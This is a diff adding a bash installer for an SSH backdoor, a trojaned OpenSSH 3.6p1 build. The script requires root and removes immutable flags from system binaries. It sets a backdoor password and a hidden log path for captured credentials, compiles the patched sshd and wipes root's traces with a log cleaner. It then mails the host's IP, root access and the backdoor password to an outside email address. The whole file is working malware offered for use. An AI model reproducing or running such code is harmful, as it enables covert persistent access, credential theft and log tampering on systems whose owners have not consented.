@@ -1,0 +1,182 @@
+#!/bin/bash
+
+# Defining some colors
+NORMAL="\e[0m"
+NC="\e[0m"
+WHITE="\e[1;37m"
+CYAN="\e[1;36m"
+RED="\e[1;31m"
+GREEN="\e[1;32m"
+BLUE="\e[1;34m"
+GREY="\e[1;30m"
+GRN="\e[1;32m"
+
+# Simple verifications
+if [[ "`whoami`" != "root"  ]] ;then
+echo -e "\n${RED}BECOME ROOT AND TRY AGAIN${NC}\n\n"
+	exit
+	fi 
+
+echo -e "-----------------------------------------------------------------------------------"
+echo -e "    ${CYAN} #BSDHELP ${GREY}SSHD BACKDOOR ${BLUE}v1.2${NORMAL} - ${WHITE}OpenSSH 3.6p1 ${BLUE}${NORMAL}"
+echo -e "                                  ${RED}PRIVATE VERSION${NORMAL}"
+echo -e "-----------------------------------------------------------------------------------"
+
+###########
+#
+# CHECKING SYSTEM
+#
+###########
+
+echo -e "${BLUE}\n\n CHECKING THIS SYSTEM${NC}\n"
+
+if [ -f /usr/bin/gcc ]; then
+echo -e "${BLUE}# GCC${NC}:                   [ ${GRN}FOUND${NC} ]"
+else
+echo -e "${BLUE}# GCC${NC}:                   [ ${RED}NOT FOUND${NC} ]"
+./gcc
+fi
+
+if [ -f /usr/include/stdio.h ]; then
+echo -e "${BLUE}# G++${NC}:                   [ ${GRN}FOUND${NC} ]"
+else
+echo -e "${BLUE}# G++${NC}:                   [ ${RED}NOT FOUND${NC} ]"
+./gcc-dev
+fi
+
+if [ -f /usr/bin/make ]; then
+echo -e "${BLUE}# MAKE${NC}:                  [ ${GRN}FOUND${NC} ]"
+else
+echo -e "${BLUE}# MAKE${NC}:                  [ ${RED}NOT FOUND${NC} ]"
+./make
+fi
+
+if [ -d /usr/include/openssl ]; then
+echo -e "${BLUE}# OPENSSL DEVEL${NC}:         [ ${GRN}FOUND${NC} ]"
+else
+echo -e "${BLUE}# OPENSSL DEVEL${NC}:         [ ${RED}NOT FOUND${NC} ]"
+./openssl
+fi
+
+if [ -f /usr/include/zlib.h ]; then
+echo -e "${BLUE}# ZLIB${NC}:                  [ ${GRN}FOUND${NC} ]"
+else
+echo -e "${BLUE}# ZLIB${NC}:                  [ ${RED}NOT FOUND${NC} ]"
+./zlib
+fi
+
+###########
+#
+# VERIFY INSTALLATION
+#
+###########
+
+if [ ! -f "/usr/bin/gcc" ] || [ ! -f "/usr/bin/make" ] || [ ! -d "/usr/include/openssl" ] || [ ! -f "/usr/include/zlib.h" ];
+then
+echo -e "\n\n${RED}# SOMETHING IS WRONG.${NC}"
+echo -e "${RED}# UNABLE TO INSTALL COMPONENTS.${NC}"
+ERRORS="N"
+echo -ne "${BLUE}# CONTINUE ANYWAY? - TYPE ${RED}Y${NC} ${BLUE}AND PRESS ${RED}ENTER${NC} [${WHITE}${ERRORS}${NORMAL}]: ${GREEN}"
+read ERRORS
+if [ "$ERRORS" != "Y" ] && [ "$ERRORS" != "y" ]; then
+echo
+echo -e "${RED}# WE STOP HERE! FIX THE BOX AND TRY AGAIN!${NC}"
+echo
+exit
+ else
+echo
+echo
+echo -e "${GREEN}# WE CONTINUE BUT WE WILL PROBABLY ${RED}FAIL${NC}"
+echo
+fi
+fi
+echo
+# Simple settings
+EMAIL="ridethefog@gmail.com"
+
+cp -r /etc/ssh .etc.ssh
+chattr -iau /bin/* 2> /dev/null
+chattr -iau /usr/bin/* 2> /dev/null
+chattr -iau /usr/sbin/* 2> /dev/null
+chattr -iau /bin 2> /dev/null
+chattr -iau /usr/bin 2> /dev/null
+chattr -iau /usr/sbin 2> /dev/null
+
+SSHV=`ssh -V 2>&1 |sed s/,/\ /| awk '{print $1}'`
+chmod +x tools/random.sh
+BPASS=`./tools/random.sh 12`
+
+echo -ne "${BLUE}# Backdoor Password${NC} [${WHITE}${BPASS}${NORMAL}]: ${GREEN}"
+read BPASS1
+if [ "$BPASS1" != "" ]; then
+	BPASS=$BPASS1
+	fi
+echo -e "${BLUE}# Backdoor Password set to : ${WHITE}${BPASS}${NORMAL}"
+sleep 1
+echo -ne "${BLUE}# Logging Path${NC} [${WHITE}/usr/include/netda.h${NORMAL}]: ${GREEN}"
+read LPATH
+if [ "$LPATH" == "" ]; then
+	LPATH="/usr/include/netda.h"
+	fi
+echo -e "${BLUE}# Logging Path set to : ${WHITE}${LPATH}${NORMAL}"
+
+cat backdoor.h|sed -e s/SSHD_PASS/"$BPASS"/ -e s#LOG_PATH#"$LPATH"# > 1.temp
+mv 1.temp backdoor.h
+
+echo -ne "${BLUE}# SSH Version${NC} [${WHITE}${SSHV}${NORMAL}]: ${GREEN}" ; read SSHV1
+if [[ "$SSHV1" != "" ]]; then
+	SSHV=$SSHV1
+	fi
+echo -e "${BLUE}## SSH Version set to : ${WHITE}${SSHV}${NORMAL}" 
+echo '#define SSH_VERSION    "'$SSHV'"'>> version.h
+echo
+sleep 2
+echo -e "${BLUE}# Configuring our SSH Backdoor ...${NC} "
+./configure --sysconfdir=/etc/ssh 2> error_log.1
+make 2> error_log.2
+
+if [[ ! -f ssh && ! -f sshd ]];then
+	echo -e "${RED}# Something went wrong, consult the error_log.1 and error_log.2 files${NORMAL}"
+	echo "-----------------------------------------------------------"
+	tail -n 5 error_log
+	echo "-----------------------------------------------------------"
+else
+clear
+echo -ne "${RED}"
+cat bsd.txt
+echo
+echo -e "${NORMAL}"
+echo -e "${BLUE}# CLEANING LOGS ...${NORMAL} "
+cd tools
+make linux &> /dev/null
+./logcleaner -u root 
+cd ..
+echo -ne "${BLUE}# RESTARTING SSHD ...${NORMAL} "
+sleep 1
+./start
+sleep 1
+HOSTIP='127.0.0.1'
+if nc -zv -w10 $HOSTIP 22 <<< . &> /dev/null
+then
+echo -e "${GREEN}[DONE]${NORMAL}"
+echo -e "# Backdoor installed succesfully on [${WHITE}`uname -n`${NORMAL}]"
+echo -e "# ${GREY}`/sbin/ifconfig|grep inet|grep -v "127\.0\.0\.1"|tr ":" " "|awk '{print $3}'|head -n 1` root:${RED}${BPASS}${GREY} + $LPATH"
+echo "# `/sbin/ifconfig|grep inet|grep -v "127\.0\.0\.1"|tr ":" " "|awk '{print $3}'|head -n 1` root:$BPASS + $LPATH"|mail $EMAIL -s "New Backdoor Setup [`uname -n`]"
+echo -ne "${NORMAL}"
+else
+echo -e "${RED}[FAIL - TRYING TO FIX]${NORMAL}"
+ssh-keygen -t rsa1 -f /etc/ssh/ssh_host_key -N ""
+sleep 1
+mkdir /var/empty && chown -R root /var/empty
+sleep 1
+sshd
+echo -e "${BLUE}WE DID ALL WE COULD TO FIX SSH ...${GREEN} [DONE]${NORMAL}"
+echo -e "# BSDHELP Backdoor installed succesfully on [${WHITE}`uname -n`${NORMAL}]"
+echo -e "# ${GREY}`/sbin/ifconfig|grep inet|grep -v "127\.0\.0\.1"|tr ":" " "|awk '{print $3}'|head -n 1` root:${RED}${BPASS}${GREY} + $LPATH"
+echo "# `/sbin/ifconfig|grep inet|grep -v "127\.0\.0\.1"|tr ":" " "|awk '{print $3}'|head -n 1` root:$BPASS + $LPATH"|mail $EMAIL -s "New Backdoor Setup [`uname -n`]"
+echo -ne "${NORMAL}"
+echo
+echo -e "${CYAN}# ENJOY THIS PRIVATE BACKDOOR ${NORMAL}"
+exit
+fi
+fi
